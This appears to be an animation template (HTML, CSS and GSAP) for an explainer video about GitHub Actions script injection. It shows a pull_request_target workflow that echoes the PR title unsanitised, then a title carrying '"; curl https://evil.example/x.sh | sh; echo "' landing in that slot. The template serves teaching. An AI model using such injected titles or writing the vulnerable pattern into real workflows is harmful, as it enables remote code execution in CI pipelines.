@@ -1,0 +1,323 @@
+<template id="03-workflow-template">
+<script src="https://cdn.jsdelivr.net/npm/gsap@3.14.2/dist/gsap.min.js"></script>
+<style>
+  @font-face { font-family: 'Barlow'; src: url('assets/fonts/Barlow-600.woff2') format('woff2'); font-weight: 600; font-style: normal; font-display: block; }
+  @font-face { font-family: 'IBM Plex Mono'; src: url('assets/fonts/IBM_Plex_Mono-400.woff2') format('woff2'); font-weight: 400; font-style: normal; font-display: block; }
+  @font-face { font-family: 'IBM Plex Mono'; src: url('assets/fonts/IBM_Plex_Mono-500.woff2') format('woff2'); font-weight: 500; font-style: normal; font-display: block; }
+  @font-face { font-family: 'IBM Plex Mono'; src: url('assets/fonts/IBM_Plex_Mono-600.woff2') format('woff2'); font-weight: 600; font-style: normal; font-display: block; }
+
+  #root {
+    position: absolute;
+    inset: 0;
+    width: 1920px;
+    height: 1080px;
+    overflow: hidden;
+    container-type: size;
+    font-family: 'IBM Plex Mono', monospace;
+    color: #F0ECE5;
+  }
+  .w03-bg {
+    position: absolute;
+    inset: 0;
+    background: #111111;
+  }
+  .w03-stage {
+    position: absolute;
+    inset: 0;
+    transform-origin: 700px 574px;
+  }
+  /* chrome */
+  .w03-kicker {
+    position: absolute;
+    left: 106px;
+    top: 106px;
+    font-weight: 500;
+    font-size: 18px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: #E85D26;
+  }
+  .w03-rule {
+    position: absolute;
+    left: 106px;
+    top: 150px;
+    width: 36px;
+    height: 2px;
+    background: #E85D26;
+    transform-origin: left center;
+  }
+  .w03-divider {
+    position: absolute;
+    left: 1316px;
+    top: 220px;
+    width: 1px;
+    height: 600px;
+    background: #282826;
+    transform-origin: center top;
+  }
+  /* YAML panel */
+  .w03-panel {
+    position: absolute;
+    left: 106px;
+    top: 260px;
+    width: 1180px;
+    height: 404px;
+    background: #1A1A18;
+    border: 1px solid #282826;
+    box-sizing: border-box;
+  }
+  .w03-panel-head {
+    position: absolute;
+    left: 0;
+    right: 0;
+    top: 0;
+    height: 64px;
+    border-bottom: 1px solid #282826;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 40px;
+    font-weight: 500;
+    font-size: 16px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: #888880;
+  }
+  .w03-panel-head .w03-tag { color: #505048; }
+  .w03-code {
+    position: absolute;
+    left: 40px;
+    top: 104px;
+    font-size: 30px;
+    font-weight: 400;
+    line-height: 60px;
+  }
+  .w03-line {
+    position: relative;
+    height: 60px;
+    white-space: pre;
+  }
+  .w03-k { color: #888880; }
+  .w03-v { color: #F0ECE5; }
+  .w03-ul-wrap { position: relative; display: inline-block; }
+  .w03-ul {
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: 6px;
+    height: 3px;
+    background: #E85D26;
+    transform-origin: left center;
+  }
+  .w03-expr { color: #F0ECE5; }
+  .w03-shell { color: #E85D26; font-weight: 600; display: none; }
+  .w03-cursor {
+    display: inline-block;
+    width: 10px;
+    height: 34px;
+    margin-left: 4px;
+    vertical-align: -6px;
+    background: #E85D26;
+    opacity: 0;
+  }
+  /* marker box (drawn from 4 segments, 0 radius) */
+  .w03-box {
+    position: absolute;
+    left: 262px;          /* 15 chars x 18px - 8 */
+    top: 4px;
+    width: 700px;         /* 38 chars x 18px + 16 */
+    height: 52px;
+  }
+  .w03-seg { position: absolute; background: #E85D26; }
+  .w03-seg-t { left: 0; top: 0; width: 100%; height: 3px; transform-origin: left center; }
+  .w03-seg-r { right: 0; top: 0; width: 3px; height: 100%; transform-origin: center top; }
+  .w03-seg-b { left: 0; bottom: 0; width: 100%; height: 3px; transform-origin: right center; }
+  .w03-seg-l { left: 0; top: 0; width: 3px; height: 100%; transform-origin: center bottom; }
+  /* right rail: PR-title strip */
+  .w03-rail-label {
+    position: absolute;
+    left: 1356px;
+    top: 452px;
+    font-weight: 500;
+    font-size: 16px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: #888880;
+  }
+  .w03-card {
+    position: absolute;
+    left: 1356px;
+    top: 490px;
+    width: 458px;
+    height: 196px;
+    transform-origin: left top;
+  }
+  .w03-card-fill {
+    position: absolute;
+    inset: 0;
+    background: #E85D26;
+    transform-origin: left top;
+  }
+  .w03-card-body {
+    position: absolute;
+    left: 28px;
+    top: 22px;
+    right: 28px;
+  }
+  .w03-card-pr {
+    font-weight: 600;
+    font-size: 16px;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    color: rgba(17,17,17,0.55);
+    margin-bottom: 12px;
+  }
+  .w03-card-text {
+    font-weight: 600;
+    font-size: 26px;
+    line-height: 38px;
+    color: #111111;
+    white-space: pre;
+  }
+</style>
+
+<div data-hf-id="hf-vowd" id="root" data-composition-id="03-workflow" data-start="0" data-duration="10.02" data-width="1920" data-height="1080">
+  <div data-hf-id="hf-hohz" class="w03-bg clip" data-start="0" data-duration="10.02" data-track-index="0"></div>
+
+  <div data-hf-id="hf-3os8" class="w03-stage clip" id="w03-stage" data-start="0" data-duration="10.02" data-track-index="1">
+    <div data-hf-id="hf-boav" class="w03-kicker" id="w03-kicker">01 / TOEGANG</div>
+    <div data-hf-id="hf-sjwy" class="w03-rule" id="w03-rule"></div>
+    <div data-hf-id="hf-z0h6" class="w03-divider" id="w03-divider"></div>
+
+    <div data-hf-id="hf-covg" class="w03-panel" id="w03-panel">
+      <div data-hf-id="hf-n2xg" class="w03-panel-head"><span data-hf-id="hf-guyh">GitHub Actions</span><span data-hf-id="hf-f7dv" class="w03-tag">YAML</span></div>
+      <div data-hf-id="hf-k7qm" class="w03-code">
+        <div data-hf-id="hf-q1u3" class="w03-line"><span data-hf-id="hf-rmkc" class="w03-k" id="w03-l1k"></span><span data-hf-id="hf-5hdo" class="w03-ul-wrap"><span data-hf-id="hf-cb1u" class="w03-v" id="w03-l1v"></span><span data-hf-id="hf-y8fn" class="w03-ul" id="w03-ul"></span></span><span data-hf-id="hf-0pa1" class="w03-cursor" id="w03-c1"></span></div>
+        <div data-hf-id="hf-ihpn" class="w03-line"><span data-hf-id="hf-5vzi" class="w03-k" id="w03-l2"></span><span data-hf-id="hf-4ne2" class="w03-cursor" id="w03-c2"></span></div>
+        <div data-hf-id="hf-i3em" class="w03-line"><span data-hf-id="hf-9u3j" class="w03-k" id="w03-l3"></span><span data-hf-id="hf-8li3" class="w03-cursor" id="w03-c3"></span></div>
+        <div data-hf-id="hf-5tah" class="w03-line" id="w03-runline"><span data-hf-id="hf-n2e3" class="w03-k" id="w03-l4k"></span><span data-hf-id="hf-1u19" class="w03-v" id="w03-l4v"></span><span data-hf-id="hf-vdaj" class="w03-expr" id="w03-expr"></span><span data-hf-id="hf-vw7q" class="w03-shell" id="w03-shell">"; curl https://evil.example/x.sh | sh; echo "</span><span data-hf-id="hf-klqy" class="w03-v" id="w03-l4q"></span><span data-hf-id="hf-l40k" class="w03-cursor" id="w03-c4"></span>
+          <div data-hf-id="hf-ws1m" class="w03-box" id="w03-box">
+            <span data-hf-id="hf-8avu" class="w03-seg w03-seg-t" id="w03-st"></span>
+            <span data-hf-id="hf-5z4i" class="w03-seg w03-seg-r" id="w03-sr"></span>
+            <span data-hf-id="hf-1w4y" class="w03-seg w03-seg-b" id="w03-sb"></span>
+            <span data-hf-id="hf-1s16" class="w03-seg w03-seg-l" id="w03-sl"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div data-hf-id="hf-uw6t" class="w03-rail-label" id="w03-rail-label">PR-titel</div>
+    <div data-hf-id="hf-56d6" class="w03-card" id="w03-card">
+      <div data-hf-id="hf-ikjs" class="w03-card-fill" id="w03-card-fill"></div>
+      <div data-hf-id="hf-6v16" class="w03-card-body" id="w03-card-body">
+        <div data-hf-id="hf-4945" class="w03-card-pr">PR #</div>
+        <div data-hf-id="hf-lakm" class="w03-card-text">"; curl
+https://evil.example/x.sh
+| sh; echo "</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function () {
+    var DUR = 9.52;
+    var tl = gsap.timeline({ paused: true });
+    var $ = function (id) { return document.getElementById(id); };
+
+    // ---- discrete text sequences (reverse-searched each update) ----
+    function seq(states) { return states; }
+    function textAt(states, t) {
+      for (var i = states.length - 1; i >= 0; i--) if (t >= states[i].t) return states[i].text;
+      return "";
+    }
+    var S = {
+      "w03-l1k": seq([{ t: 0, text: "" }, { t: 1.00, text: "o" }, { t: 1.07, text: "on" }, { t: 1.14, text: "on:" }, { t: 1.22, text: "on: " }]),
+      "w03-l1v": seq([{ t: 0, text: "" }, { t: 1.34, text: "pull" }, { t: 1.48, text: "pull_req" }, { t: 1.60, text: "pull_request" }, { t: 1.80, text: "pull_request_tar" }, { t: 1.92, text: "pull_request_target" }]),
+      "w03-l2": seq([{ t: 0, text: "" }, { t: 2.10, text: "jo" }, { t: 2.20, text: "jobs:" }]),
+      "w03-l3": seq([{ t: 0, text: "" }, { t: 2.42, text: "  val" }, { t: 2.54, text: "  valida" }, { t: 2.66, text: "  validate-" }, { t: 2.80, text: "  validate-tit" }, { t: 2.92, text: "  validate-title:" }]),
+      "w03-l4k": seq([{ t: 0, text: "" }, { t: 4.28, text: "    ru" }, { t: 4.38, text: "    run:" }]),
+      "w03-l4v": seq([{ t: 0, text: "" }, { t: 4.50, text: " ec" }, { t: 4.60, text: " echo" }, { t: 4.70, text: " echo \"" }]),
+      // bulk paste of the expression on "titel"
+      "w03-expr": seq([{ t: 0, text: "" }, { t: 4.86, text: "${{ github.event.pull_request.title }}" }]),
+      "w03-l4q": seq([{ t: 0, text: "" }, { t: 5.04, text: "\"" }])
+    };
+    var ids = Object.keys(S);
+    var els = ids.map($);
+
+    // which line owns the cursor
+    var cursors = [$("w03-c1"), $("w03-c2"), $("w03-c3"), $("w03-c4")];
+    function activeLine(t) {
+      if (t < 0.9) return 0;       // waiting on line 1
+      if (t < 2.02) return 0;
+      if (t < 2.32) return 1;
+      if (t < 4.2) return 2;
+      return 3;
+    }
+
+    var driver = { t: 0 };
+    tl.to(driver, {
+      t: DUR,
+      duration: DUR,
+      ease: "none",
+      onUpdate: function () {
+        var t = driver.t;
+        for (var i = 0; i < ids.length; i++) {
+          var txt = textAt(S[ids[i]], t);
+          if (els[i].textContent !== txt) els[i].textContent = txt;
+        }
+        // deterministic sin-square blink, ~0.6s cycle; solid while typing
+        var a = activeLine(t);
+        var typing = (t > 1.0 && t < 1.95) || (t > 2.1 && t < 2.22) || (t > 2.42 && t < 2.95) || (t > 4.28 && t < 5.06);
+        var on = typing || Math.sin(t * Math.PI * 2 / 0.6) > 0;
+        var hide = t < 0.5 || t > 8.0; // cursor gone once the payload lands
+        for (var c = 0; c < cursors.length; c++) {
+          cursors[c].style.opacity = (!hide && c === a && on) ? "1" : "0";
+        }
+      }
+    }, 0);
+
+    // ---- Scene 1 (0.0–3.2): chrome + panel + first three lines ----
+    tl.fromTo("#w03-kicker", { opacity: 0, x: -24 }, { opacity: 1, x: 0, duration: 0.5, ease: "power3.out" }, 0.05);
+    tl.fromTo("#w03-rule", { scaleX: 0 }, { scaleX: 1, duration: 0.4, ease: "power2.out" }, 0.2);
+    tl.fromTo("#w03-panel", { opacity: 0, y: 40 }, { opacity: 1, y: 0, duration: 0.7, ease: "power3.out" }, 0.15);
+    tl.fromTo("#w03-divider", { scaleY: 0 }, { scaleY: 1, duration: 0.8, ease: "power2.inOut" }, 0.5);
+    // fire-orange underline on pull_request_target as VO reaches "pull requests"
+    tl.fromTo("#w03-ul", { scaleX: 0 }, { scaleX: 1, duration: 0.5, ease: "power2.out" }, 2.24);
+
+    // slow macro push-in underneath the whole shot
+    tl.fromTo("#w03-stage", { scale: 1 }, { scale: 1.035, duration: DUR, ease: "none" }, 0);
+
+    // ---- Scene 2 (3.2–6.0): run line types, marker box draws round ${{ }} ----
+    tl.fromTo("#w03-st", { scaleX: 0 }, { scaleX: 1, duration: 0.18, ease: "power1.in" }, 5.30);
+    tl.fromTo("#w03-sr", { scaleY: 0 }, { scaleY: 1, duration: 0.08, ease: "none" }, 5.48);
+    tl.fromTo("#w03-sb", { scaleX: 0 }, { scaleX: 1, duration: 0.18, ease: "none" }, 5.56);
+    tl.fromTo("#w03-sl", { scaleY: 0 }, { scaleY: 1, duration: 0.10, ease: "power1.out" }, 5.74);
+
+    // ---- Scene 3 (6.0–9.52): PR-title strip slides in, drops into the slot ----
+    tl.fromTo("#w03-rail-label", { opacity: 0, y: 12 }, { opacity: 1, y: 0, duration: 0.4, ease: "power2.out" }, 6.96);
+    tl.fromTo("#w03-card", { x: 620, opacity: 1 }, { x: 0, opacity: 1, duration: 0.6, ease: "power3.out" }, 7.0);
+
+    // flight: card text clears, orange fill shrinks/moves onto the slot rect
+    // card origin (1356,490) 458x196 -> slot rect: panel(106+1)+code(40)+box(262) , panel(260+1)+code(104)+line(180)+box(4)
+    var slotX = 107 + 40 + 262, slotY = 261 + 104 + 180 + 4;
+    var dx = slotX - 1356, dy = slotY - 490;
+    tl.fromTo("#w03-card-body", { opacity: 1 }, { opacity: 0, duration: 0.2, ease: "power1.in" }, 7.95);
+    tl.fromTo("#w03-rail-label", { opacity: 1 }, { opacity: 0.35, duration: 0.3, ease: "power1.out", immediateRender: false }, 7.95);
+    tl.fromTo("#w03-card", { x: 0, y: 0 }, { x: dx, y: dy, duration: 0.5, ease: "power3.inOut", immediateRender: false }, 8.0);
+    tl.fromTo("#w03-card-fill", { scaleX: 1, scaleY: 1 }, { scaleX: 844 / 458, scaleY: 52 / 196, duration: 0.5, ease: "power3.inOut" }, 8.0);
+
+    // swap: ${{ }} out, shellcode in (instant discrete swap under the fill)
+    tl.set("#w03-expr", { display: "none" }, 8.48);
+    tl.set("#w03-shell", { display: "inline" }, 8.48);
+    tl.fromTo("#w03-box", { width: 700 }, { width: 844, duration: 0.01, ease: "none" }, 8.48);
+    // fill collapses toward the slot start, revealing the orange payload inside the box
+    tl.to("#w03-card-fill", { scaleX: 0, duration: 0.35, ease: "power2.inOut" }, 8.52);
+    tl.fromTo("#w03-shell", { opacity: 0.6 }, { opacity: 1, duration: 0.3, ease: "power1.out" }, 8.52);
+    // hold still ~last second
+
+    window.__timelines = window.__timelines || {};
+    window.__timelines["03-workflow"] = tl;
+  })();
+</script>
+</template>
